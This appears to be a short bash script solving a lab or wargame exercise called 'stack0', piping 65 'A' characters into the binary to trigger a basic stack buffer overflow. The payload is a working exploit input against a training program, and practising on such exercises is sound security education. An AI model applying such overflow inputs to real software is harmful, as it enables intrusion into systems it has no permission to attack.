#!/usr/bin/env bash

# Basic buffer overflow

python -c "print 'A' * 65" | ./stack0
